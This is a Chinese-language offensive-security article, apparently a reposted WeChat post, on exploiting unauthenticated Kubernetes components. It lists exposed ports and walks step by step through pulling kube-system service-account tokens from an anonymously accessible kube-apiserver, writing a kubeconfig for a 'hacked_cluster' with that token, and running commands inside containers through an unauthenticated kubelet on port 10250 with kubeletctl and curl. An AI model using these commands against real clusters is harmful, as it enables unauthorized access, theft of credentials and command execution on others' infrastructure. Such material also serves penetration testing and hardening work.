> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ukm64QJ1yytKNpwRBeP6sg)

除了容器逃逸问题，未授权问题是目前 k8s 存在最多的问题，以下是常见的 k8s 未授权：

**kube-apiserver**：

6443，8080

未授权访问获取 kube-system 的 token，通过 kubectl 使用 kube-system 的 token 获取 pod 列表。之后可进一步创建 pod 或控制已有 pod 进行命令执行等操作。

**kubelet**：

10250，10255

kubeletctl 批量获取 pod 等信息，尝试获取 pod 内 / var/run/secrets/kubernetes.io/serviceaccoun / 的 token

**etcd**：

2379

导出全量 etcd 配置，获取 k8s 认证证书等关键信息，进而通过 kubectl 创建恶意 pod 或控制已有 pod，后续可尝试逃逸至宿主机

**dashboard**：

30000 以上

**docker**：

2375

Docker daemon 默认监听 2375 端口且未鉴权，我们可以利用 API 来完成 Docker 客户端能做的所有事情。

### 1. kube-apiserver 未授权访问

apiserver 有两个端口，8080 和 6443。现在的云服务商提供的容器默认已不存在 8080 端口，主要问题还是在 6443 端口上。

正常访问 6443 端口，会出现以下情况，我们默认访问的角色就是系统给的 anonymous。

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVCXo1ChQtnXWBGUWK9Has1SILmnYsicH6BjZ5qGrnxhQFQFjWK5F1oib578MDPuIgEdibdcj3fib9xxg/640?wx_fmt=png)

当把`system:anonymous`用户绑定到`cluster-admin`的集群角色时，再来访问。即可看到能访问的内容：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVCXo1ChQtnXWBGUWK9Has1d9gJ6lNiaoA6Se5Vt1xxGQEg28ELW5pjVTjhYuwrD5wRicia3G7MpLGuw/640?wx_fmt=png)

访问`https://192.168.41.22:6443/api/v1/namespaces/kube-system/secrets/` 获取`kube-system`命名空间的`token`信息：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVCXo1ChQtnXWBGUWK9Has1tYlo3k2br3ORYfoBArohTh8MxORsmWhplb4Xt20EjsKicUF919QbwWw/640?wx_fmt=png)

系统自带的服务账号没啥操作权限，需要寻找运维人员自建的。总之，**有 admin 就找 admin**，没有的话找个**非系统自带账号**或者**尝试 default 账号**。

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVCXo1ChQtnXWBGUWK9Has1UPjJa4NIGggFVib4K9FGJSSlpdcGFWiciagtcGoGNuFXA8v2Fme6cRzsQ/640?wx_fmt=png)

拿到了 token 后，可以在攻击机上安装 kubectl 工具，然后执行以下命令创建一个 test_config，token 处填入获取的 token：

```
touch test_config

kubectl --kubeconfig=./test_config config set-credentials hacker --token=TOKEN

kubectl --kubeconfig=./test_config config set-cluster hacked_cluster --server=https://192.168.41.22:6443/  --insecure-skip-tls-verify

kubectl --kubeconfig=./test_config config set-context test_context --cluster=hacked_cluster --user=hacker

kubectl --kubeconfig=./test_config config use-context test_context

```

生成的文件内容为：

```
apiVersion: v1
clusters:
- cluster:
  insecure-skip-tls-verify: true
  server: https://192.168.41.22:6443/
name: hacked_cluster
contexts:
- context:
  cluster: hacked_cluster
  user: hacker
name: test_context
current-context: test_context
kind: Config
preferences: {}
users:
- name: hacker
user:
  token: ZXlKaGJHY2lPaUpTVXpJMU5TOKEN

```

通过 kubectl 加载刚才的 config 文件执行 pod 里面的命令：

```
kubectl --kubeconfig=./test_config get nodes -A

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVCXo1ChQtnXWBGUWK9Has1ggK1QQcrwibfKnxdDS55UePHjtVY5xPcORolnw05QgpgZpRHFIaib0pA/640?wx_fmt=png)

### 2. kubelet 未授权访问

每一个 **Worker 节点**都有一个 kubelet 服务，kubelet 监听了`10250`（kubelet API），`10248`，`10255`（readonly API）等端口。

正常情况下访问是没有权限的：

https://192.168.41.23:10250/pods

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVCXo1ChQtnXWBGUWK9Has1m2Q1ia8yuNv3ib8WzQ2bVc4jSKG9kKjHWvH2iajlG1Y1S5CIqptAic65Ag/640?wx_fmt=png)

`authentication.anonymous.enabled`配置不当设置为 true 时，允许匿名访问 10250 端口：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVCXo1ChQtnXWBGUWK9Has1nfZd9jOTZibFzfY91PFexjJic6PibRNWmQCNwk1HV5TPsskEKqCKMAhgA/640?wx_fmt=png)

访问存在如下回显，就是存在未授权访问：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVCXo1ChQtnXWBGUWK9Has1IZCUyYg8rBibOQz9J5OHTayUpdJ0EJYIaelpodE3XHJvBTibYd0Dic4ibw/640?wx_fmt=png)

**利用**：

https://github.com/cyberark/kubeletctl/releases

下载 kubeletctl 工具，执行命令：

```
./kubeletctl pods -s 192.168.41.23 --port 10250

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVCXo1ChQtnXWBGUWK9Has1SiaNz0BydyWm3WXg375DdAicia5ah8xYwv203dHkILAxOhyGw0eJF9iaqg/640?wx_fmt=png)

可以看到 pod，namespace，containers。

执行 pod 里容器的命令：

```
curl -k https://nodeip:10250/run/$namespace/$POD/$CONTAINERS -d "cmd=ls" --insecure

curl -k https://192.168.41.23:10250/run/default/nginx-f89759699-tct4p/nginx -d "cmd=ls" --insecure

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVCXo1ChQtnXWBGUWK9Has1cLr6q6xrImibjDKDDGMWPAA72HyWJYpLOvkYyGfPdV5D0GSUvOx7SoA/640?wx_fmt=png)

如果是 10255 端口的未授权而非 10250，它是**只读端口**，无法直接利用在容器中执行命令，但是可以获取环境变量 ENV、主进程 CMDLINE 等信息，里面可能包含密码和秘钥等敏感信息。

### 参考链接

[https://mp.weixin.qq.com/s/T2QGLlKwjaUByDtGFL94PQ](https://mp.weixin.qq.com/s?__biz=MzIxNTIzMzM1Ng==&mid=2651104364&idx=1&sn=a22dac0da090751552d46a8b622bfbbc&scene=21#wechat_redirect)

https://blog.csdn.net/w1590191166/article/details/122028001?spm=1001.2014.3001.5501